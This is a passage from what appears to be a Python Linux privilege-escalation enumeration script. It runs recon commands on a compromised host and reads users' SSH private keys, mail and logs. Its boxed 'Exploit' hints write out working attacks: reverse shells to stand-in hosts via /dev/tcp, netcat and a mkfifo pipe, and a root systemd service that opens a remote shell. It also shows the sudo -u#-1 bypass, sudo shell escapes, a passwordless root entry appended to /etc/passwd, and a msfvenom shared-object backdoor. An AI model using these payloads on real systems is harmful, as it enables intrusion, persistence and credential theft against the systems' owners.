print("\t║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║")
print("\t║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║")
print("\t║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║")
print("\t║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║")
print("\t║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Sudo Version:",XX)
os.system ('sudo -V | grep --color=always "Sudo version"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║The version is not listed in our database. However, make sure to keep your system always up-to-date. Old version are║")
print("\t║vulnerable. Use Google for more details or use:                                                                     ║")
print('\t║  searchsploit "sudo"                                                                                               ║')
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Is sudo version vulnerable?",XX)
os.system ('sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the sudo version <= v1.28, it is exploitable.                                                                    ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║    ",RED,"sudo -u#-1 /bin/bash",XX,"                                                                                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Available shells:",XX)
os.system ("cat /etc/shells 2>/dev/null")
print("\n",BLUE,"[+] Bash version:",XX)
os.system ("bash --version | grep version 2>/dev/null")
print("\n",BLUE,"[+] Check Bash Shellshock vulnerability:",XX)
os.system ("env x='() { :;}; echo bash is vulnerable' bash -c 'echo bash is not vulnerable'")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Other test:                                                                                                         ║")
print("\t║  https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Path Environment:",XX)
os.system ('systemctl show-environment')
print("\n",BLUE,"[+] System Path:",XX)
os.system ('echo $PATH')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If you have write permissions on any folder inside the PATH variable you may be able to hijack some libraries or    ║")
print("\t║binaries. Read more:                                                                                                ║")
print("\t║  https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/                     ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Lists block devices (hardrives, memory cards, etc):",XX)
os.system("lsblk -a")
print("\n",BLUE,"[+] Lists USB devices:",XX)
os.system("lsusb")
print("\n",BLUE,"[+] Information about SATA Devices for /dev/sda1:",XX)
os.system("hdparm /dev/sda1 2>/dev/null ")
print("\n",BLUE,"[+] Linux File System Information:",XX)
os.system("fdisk -l 2>/dev/null ")
print("\n",BLUE,"[+] List of running services:",XX)
os.system("service --status-all")
print("\n",BLUE,"[+] File-systems mounted:",XX)
os.system ('df -h')
print("\n",BLUE,"[+] ASLR Settings:",XX)
os.system ('cat /proc/sys/kernel/randomize_va_space')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Valid Settings:                                                                                                     ║")
print("\t║  0 = Disablabed                                                                                                    ║")
print("\t║  1 = Conservative Randomization                                                                                    ║")
print("\t║  2 = Full Randomization                                                                                            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] ASLR Address Space:",XX)
os.system ('ldd /bin/bash')
print("\n",BLUE,"[+] SELinux status:",XX)
os.system ('sestatus 2>/dev/null')
print("\n",BLUE,"[+] Abusing systemctl:",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Create NewRCE.service and write:                                                                                    ║")
print("\t║    [Unit]                                                                                                          ║")
print("\t║    Description=rooooot                                                                                             ║")
print("\t║    [Service]                                                                                                       ║")
print("\t║    Type=simple                                                                                                     ║")
print("\t║    User=root                                                                                                       ║")
print("\t║    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/a.a.a.a/443 0>&1'                                                   ║")
print("\t║    [Install]                                                                                                       ║")
print("\t║    wantedBy=multi-user.target                                                                                      ║")
print("\t║Open listener on your machine                                                                                       ║")
print("\t║    nc -nlvp 443                                                                                                    ║")
print("\t║On Victim Machine:                                                                                                  ║")
print("\t║    systemctl enable /tmp/NewRCE.service                                                                            ║")
print("\t║    systemctl start NewRCE                                                                                          ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Total number of installed packages:",XX)
os.system ('apt list --installed | wc -l 2>/dev/null')
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║You can display all installed packages by doing:                                                                      ║")
print("\t║  apt list --installed                                                                                                ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",RED,"\n\n\t\tEnumeration on progress ╔══════════════════.................(20%).....................................",XX,"         \n")
time.sleep(5)
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ══════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] Up Time:",XX)
os.system("uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'")
print("\n",BLUE,"[+] System Date:",XX)
os.system ('date 2>/dev/null')
print("\n",BLUE,"[+] CPU Information:",XX)
os.system ('lscpu')
print("\n",BLUE,"[+] System Timer List:",XX)
os.system ('systemctl list-timers --all')
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] What is SUID/SGID?",XX)
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute with the permission of the owner (SUID)║")
print("\t║or group (SGID). You can identify SUID and SGIDs by a representative 's' in the execute permission field the file:    ║")
print("\t║-rwsr-sr-x can often be exploit d to gain root privilege.                                                             ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Find capability files:",XX)
os.system ("getcap -r / 2>/dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Capability files are different from system to another system. Googling them my revile a way of how to exploit them. ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Capability with setui+ep:",XX)
os.system ("getcap -r / 2>/dev/null | grep cap_setuid+ep")
print("\n",BLUE,"[+] Built-in Binaries:",XX)
print("\t/usr/sbin/pppd                    |  /usr/sbin/exim4")
print("\t/usr/bin/ntfs-3g                  |  /usr/bin/chsh")
print("\t/usr/bin/su                       |  /usr/bin/chfn")
print("\t/usr/bin/mount                    |  /usr/bin/sudo")
print("\t/usr/bin/umount                   |  /usr/bin/pkexec")
print("\t/usr/bin/passwd                   |  /usr/bin/newgrp")
print("\t/usr/bin/gpasswd                  |  /usr/bin/fusermount")
print("\t/usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs")
print("\t/usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign")
print("\t/usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1")
print("\t/usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper")
print("\t╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t║Most linux system have these Binaries, and they are built-in, no escalation   ║")
print("\t║is done by them unless file permission has been change.                       ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Finding System SUID:",XX)
os.system("find / -perm -u=s 2>/dev/null | xargs ls -la --color=always")
print("\n",BLUE,"[+] SUID not built-in (Supper Interesting :D)",XX)
os.system("find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v 'pppd' | grep -v 'exim4' | grep -v 'ntfs-3g' | grep -v 'chsh' | grep -v 'su' | grep -v 'chfn' | grep -v 'mount' | grep -v 'sudo' | grep -v 'umount' | grep -v 'pkexec' | grep -v 'passwd' | grep -v 'newgrp' | grep -v 'gpasswd' | grep -v 'fusermount' | grep -v 'mount.nfs' | grep -v 'mount.cifs' | grep -v 'Xorg.wrap' | grep -v 'ssh-keysign' | grep -v 'chrome-sandbox' | grep -v 'polkit-agent-helper-1' | grep -v 'vmware-user-suid-wrapper' | grep -v 'dbus-daemon-launch-helper'")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID):                                             ║")
print("\t║-rw",RED,"x",XX,"              -rwx     -rwx                                                                                 ║")
print("\t║SUID                                                                                                                ║")
print("\t║-rw",RED,"s",XX,"                                                                                                            ║")
print("\t║Visite:                                                                                                             ║")
print("\t║  https://gtfobins.github.io/                                                                                       ║")
print("\t║  https://mil0.io/linux-privesc/                                                                                    ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Finding System SGID (execute as the group):",XX)
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║When bit “2” is set to group it becomes SGID (Set Group ID):                                                        ║")
print("\t║-rwx     -rw",RED,"x",XX,"              -rwx                                                                                 ║")
print("\t║         SGID                                                                                                       ║")
print("\t║         -rw",RED,"s",XX,"                                                                                                   ║")
print("\t║Visite:                                                                                                             ║")
print("\t║  https://gtfobins.github.io/                                                                                       ║")
print("\t║  https://mil0.io/linux-privesc/                                                                                    ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Find sticky-bit binaries:",XX)
os.system ('find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null')
print("\n",BLUE,"[+] World writable scripts invoked as root:",XX)
print("\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/dev/null | xargs ls -la",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If you find a script that is owned by root but is writable by anyone, you can add your own malicious code into it & ║")
print("\t║it will escalate your privileges when the script runs as root                                                       ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║    ",RED,"bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file",XX,"                                 ║")
print("\t║    ",RED,"netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file ",XX,"                                         ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] World writable directories:",XX)
os.system ('find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null')
print("\n",BLUE,"[+] World executable folders:",XX)
os.system ('find / -perm o=x -type d 2>/dev/null')
print("\n",BLUE,"[+] writable config files:",XX)
os.system ('find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null')
print("\n",BLUE,"[+] How Files Can Be Upload/Download:",XX)
os.system ('which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Some of them my have file misconfiguration and my lead to user escalation. File Transfer Cheatsheet: Windows & Linux║")
print("\t║  https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/                                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Unexpected commands allows you to read and/or write files or even execute command:",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║",RED,"sudo awk 'BEGIN {system('/bin/sh')}'",XX,"                                                                            ║")
print("\t║",RED,"sudo find /etc -exec sh -i \;",XX,"                                                                                   ║")
print("\t║",RED,"sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh",XX,"                                                            ║")
print("\t║",RED,"sudo tar c a.tar -I ./runme.sh a",XX,"                                                                                ║")
print("\t║",RED,"ftp>!/bin/sh",XX,"                                                                                                    ║")
print("\t║",RED,"less>! <shell_comand>",XX,"                                                                                           ║")
print("\t║                                Give it a try                                                                       ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Profiles files:",XX)
os.system ('ls -la /etc/profile /etc/profile.d/')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell.║")
print("\t║Therefore, if you can write or modify any of the files, you can escalate privilege.                                 ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Is the .bashrc file writable?",XX)
os.system ('ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -iname .bashrc -xdev 2>/dev/null | xargs ls -la --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If so, malicious commands can be written to it and will be executed when the user/root logs in.                     ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",RED,"\n\n\t\tEnumeration on progress ╔═══════════════════════════════════(50%).....................................",XX,"         \n")
time.sleep(5)
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═════════════════════════════════════[ System Process and Services ]════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Have a look to what processes are being executed and check if any process has more privileges than it should.       ║")
print("\t║You can also use a tool called psyp.                                                                                ║")
print("\t║  https://github.com/DominicBreuker/pspy                                                                            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Running Proccess on the system:",XX)
os.system ('ps aux')
print("\n",BLUE,"[+] Running Proccess as root:",XX)
os.system ('ps aux | grep --color=always root')
print("\n",BLUE,"[+] Running Proccess as current user:",XX)
os.system ('ps aux | grep --color=always $USER')
print("\n",BLUE,"[+] Process binaries and associated permissions:",XX)
os.system ("ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null")
print("\n",BLUE,"[+] Are service config files readable/wreitable by current user:",XX)
os.system ("find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null")
print("\n",BLUE,"[+] Shared object libraries (GOOD FOR BACKDOOR):",XX)
os.system ("ldd /usr/local/bin/program 2>/dev/null")
print("\n",BLUE,"[+] Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):",XX)
os.system ('objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If any executable is found, create the backdoor using any payload you wich, using the same file name found.         ║")
print("\t║For Example:                                                                                                        ║")
print("\t║Create payload using msfvenome:                                                                                     ║")
print("\t║  msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> -f elf-so -o FILENAME.so║")
print("\t║Then send the file to the same directory, configure a Metasploit listener with the same payloadlunch and wait for   ║")
print("\t║the program to be launched by a user with elevated privileges.                                                      ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] Current User Crontab:",XX)
os.system ('crontab -l')
print("\n",BLUE,"[+] Find World-Writable Cron jobs:",XX)
os.system ("find /etc/cron* -type f -perm -o+w -exec ls -l {} \;")
print("\n",BLUE,"[+] Other User Crontab [It may need root]:",XX)
os.system ('cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If you have the root/user password, try to run the command manually:                                                ║")
print('\t║  cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null                                                 ║')
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Scheduled Jobs",XX)
os.system ('cat /etc/crontab')
print("\n\033[0;37;41mIf the File is Writable",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.              ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║    ",RED,"echo '/bin/sh' >> file",XX,"                                                                                      ║")
print("\t║    ",RED,"echo '/bin/bash' >> file ",XX,"                                                                                   ║")
print("\t║    ",RED,"echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file",XX,"                                                        ║")
print("\t║    ",RED,"echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' >> file",XX,"                     ║")
print("\t║    ",RED,"echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file",XX,"                                                   ║")
print("\t║    ",RED,"echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file",XX,"                                           ║")
print("\t║",RED,"You can use any Reverse Shell payload from payloadallthethings in GitHub",XX,"                                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═════════════════════════════════════[ Communications & Networking ]════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] Basic Network Details:",XX)
os.system ('ifconfig | grep -v "ether\|loop\|TX\|RX"')
print("\n",BLUE,"[+] Default Gatway:",XX)
os.system ('route 2>/dev/null')
print("\n",BLUE,"[+] Full Network Details:",XX)
os.system ('ifconfig')
print("\n",BLUE,"[+] Firewall Rulls:",XX)
os.system ('iptables -nvL 2>/dev/null')
print("\n",BLUE,"[+] Other users & hosts are communicating with the system:",XX)
os.system ("lsof -i")
print("\n",BLUE,"[+] Open Ports:",XX)
os.system ('netstat -tulpna')
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Are there any open ports on localhost we did not see when we were doing nmap? This might need tunneling or connecting ║")
print("\t║to it locally. If nothing is displayed run the command manually: netstat -tulpna                                      ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Network Route & Neighbours:",XX)
os.system ('route; ip n')
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Want to know how many hops are between our compromised machine, and other network segments, do the following manually:║")
print("\t║traceroute –n <ip address>                                                                                            ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] ARP Cashe:",XX)
os.system ('arp; arp -en | grep -v Address')
print("\n",BLUE,"[+] Hosts File:",XX)
os.system ('cat /etc/hosts')
print("\n",BLUE,"[+] DNS Server:",XX)
os.system ('cat /etc/resolv.conf | grep nameserver')
print("\n",BLUE,"[+] Outbound port connectivity:",XX)
os.system ('nmap -sT -p4444-4450 portquiz.net 2>/dev/null')
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Knowing this information will come in handy if and when we need to establish outbound connections to other systems  ║")
print( "\t║we control for the purpose of maintaining access or exfiltrating data.                                              ║")
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",RED,"\n\n\t\tEnumeration on progress ╔═══════════════════════════════════(80%)═════════════════....................",XX,"         \n")
time.sleep(5)
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═══════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] SSH is configured for Public Key Authentication:",XX)
os.system ('cat /etc/ssh/sshd_config | grep "PubkeyAuthentication" --color=always')
print("\n",BLUE,"[+] Identify any existing public or private keys:",XX)
os.system ('ls -la /$USER /etc/ssh /home/$USER/.ssh/ --color=always 2>/dev/null; cat /home/$USER/.ssh/id_rsa 2>/dev/null; cat /home/$USER/.ssh/id_dsa 2>/dev/null')
print("\n\033[0;37;41mExploiting Misconfigured SSH Keys",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely perform a number of network   ║")
print("\t║services, such as remote authentication or file transfer over an unsecured network. Exploit:                        ║")
print("\t║  https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] id_rsa:",XX)
os.system("find / -iname id_rsa 2>/dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If anyone have access to any user's id_rsa, he can login to the system using that key.                              ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║    ",RED,"scp -P 22 username@v.v.v.v:/path/to/victid_rsaim /path/to/attacker",XX,"                                          ║")
print("\t║    ",RED,"chmod 0600 id_rsa",XX,"                                                                                           ║")
print("\t║    ",RED,"ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa",XX,"                                                                  ║")
print("\t║Read More:                                                                                                          ║")
print("\t║  https://matt.might.net/articles/ssh-hacks/                                                                        ║")
print("\t║  https://book.hacktricks.xyz/pentesting/pentesting-ssh                                                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] id_dsa:",XX)
os.system("find / -iname id_dsa 2>/dev/null")
print("\n",BLUE,"[+] authorized_keys:",XX)
os.system("find / -iname authorized_keys 2>/dev/null")
print("\n",BLUE,"[+] ssh_config File:",XX)
os.system("ls -la /etc/ssh/ssh_config --color=always")
print("\n",BLUE,"[+] Reading ssh_config File:",XX)
os.system("cat /etc/ssh/ssh_config")
print("\n",BLUE,"[+] sshd_config File:",XX)
os.system("ls -la /usr/share/openssh/sshd_config --color=always 2>/dev/null")
print("\n",BLUE,"[+] Reading sshd_config File:",XX)
os.system("cat /usr/share/openssh/sshd_config 2>/dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Read more about sshd_config file:                                                                                   ║")
print("\t║  https://www.ssh.com/academy/ssh/sshd_config                                                                       ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] hosts.denied:",XX)
os.system("ls -la /etc/hosts.denied --color=always 2>/dev/null")
print("\n",BLUE,"[+] Reading hosts.denied:",XX)
os.system("cat /etc/hosts.denied 2>/dev/null")
print("\n",BLUE,"[+] hosts.allow:",XX)
os.system("ls -la /etc/hosts.allow --color=always 2>/dev/null")
print("\n",BLUE,"[+] Reading hosts.allow:",XX)
os.system("cat /etc/hosts.allow 2>/dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║When a client attempts to connect to a network service on a remote system, these files are used to determine whether║")
print("\t║client access is allowed or denied. Use /etc/hosts.allow and /etc/hosts.deny to define rules that selectively allow ║")
print("\t║or deny clients access to server daemons on local system.                                                           ║")
print("\t║Read More:                                                                                                          ║")
print("\t║  https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                                                 ║")
print("\t║  http://www.freekb.net/Article?id=1091                                                                             ║")
print("\t║  https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/                    ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Any active SSH session:",XX)
os.system("ps aux | grep sshd")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If any session is found, the session can be hijacked. Read more about SSH session hijacking:                        ║")
print("\t║  https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                                         ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] Mail File:",XX)
os.system ('ls -la /var/mail/ --color=always 2>/dev/null')
print("\n",BLUE,"[+] Reading Mail File:",XX)
os.system ('cat /var/mail/*')
print("\n",BLUE,"[+] List Root Directory:",XX)
os.system ('ls -la /root/ 2>/dev/null --color=always')
print("\n",BLUE,"[+] Home Directory:",XX)
os.system ('ls -la /home/ --color=always 2>/dev/null')
print("\n",BLUE,"[+] Tmp Directory:",XX)
os.system ('ls -la /tmp --color=always 2>/dev/null')
print("\n",BLUE,"[+] Backup Directory:",XX)
os.system ("ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup")
print("\n",BLUE,"[+] Apache2 Version:",XX)
os.system ('apache2 -v 2>/dev/null; httpd -v 2>/dev/null')
print("\n",BLUE,"[+] Apache User:",XX)
os.system ("grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always")
print("\n",BLUE,"[+] Apache Config File:",XX)
os.system ('cat /var/apache2/config.inc 2>/dev/null')
print("\n",BLUE,"[+] Check readability of apache/nginx access log:",XX)
os.system ('cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null')
os.system ('cat /var/log/apache2/access.log 2>/dev/null')
os.system ('cat /var/log/nginx/access.log 2>/dev/null')
print("\n",BLUE,"[+] MySQL Version:",XX)
os.system ('mysql --version 2>/dev/null --color=always')
print("\n",BLUE,"[+] MySQL:",XX)
os.system ('ls -la /var/lib/mysql 2>/dev/null --color=always')
print("\n",BLUE,"[+] Log File:",XX)
os.system ('ls -la /var/log 2>/dev/null --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Do the following and see if there is any password:-                                         ║")
print("\t║  grep -r passw . 2>/dev/null                                                               ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] .config file in /var/www:",XX)
os.system ('ls -la /var/www --color=always 2>/dev/null')
print("\n",BLUE,"[+] Spool File:",XX)
os.system ('ls -la /var/spool 2>/dev/null --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Contains data which is awaiting some kind of later processing. Data in /var/spool represents║")
print("\t║work to be done in the future (by a program, user, or administrator); often data is deleted ║")
print("\t║PS: Have a look at the mail directory.                                                      ║")
print("\t║after it has been processed. Read More:                                                     ║")
print("\t║  https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] PostgreSQL Version:",XX)
os.system ('psql -V 2>/dev/null')
print("\n",BLUE,"[+] PostgreSQL:",XX)
os.system ('ls -la /var/lib/pgsql 2>/dev/null')
print("\n",BLUE,"[+] System files dont belong to root:",XX)
os.system ('find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always')
print("\n",BLUE,"[+] Tools/Languages Installed:",XX)
